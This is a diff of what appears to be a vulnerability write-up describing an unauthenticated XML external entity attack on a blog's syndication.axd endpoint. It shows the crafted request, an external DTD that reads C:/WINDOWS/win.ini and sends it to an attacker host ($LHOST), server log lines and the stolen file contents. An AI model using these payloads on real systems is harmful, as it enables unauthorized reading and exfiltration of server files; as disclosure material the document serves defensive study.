@@ -41,7 +41,7 @@ An unauthenticated user can submit a malicious request specifying an external XM
 http://$RHOST/blog/syndication.axd?apml=http://$LHOST/oob.xml
 ~~~
 
-~~~{.xml command="oob.xml"}
+~~~{.xml}
 <?xml version="1.0"?>
 <!DOCTYPE foo SYSTEM "https://$LHOST/exfil.dtd">
 <foo>&e1;</foo>
@@ -57,7 +57,7 @@ $RHOST - - [01/Apr/2019:16:34:40 -0600] "GET /exfil.dtd HTTP/1.1" 200 326 "-" "-
 
 The external DTD is then parsed and instructs the application to read a local file:
 
-~~~{command="ex.dtd"}
+~~~{.xml}
 <!ENTITY % p1 SYSTEM "file:///C:/WINDOWS/win.ini">
 <!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://$LHOST/EX?%p1;'>">
 %p2;
@@ -73,7 +73,7 @@ $RHOST - - [01/Apr/2019:16:34:40 -0600] "GET /EX?;%20for%2016-bit%20app%20suppor
 
 Requests the contents of specified files (or `C:/Windows/win.ini` by default). It then writes the files to the current folder:
 
-~~~{command="C_Windows_win.ini"}
+~~~
 ; for 16-bit app support
 [fonts]
 [extensions]
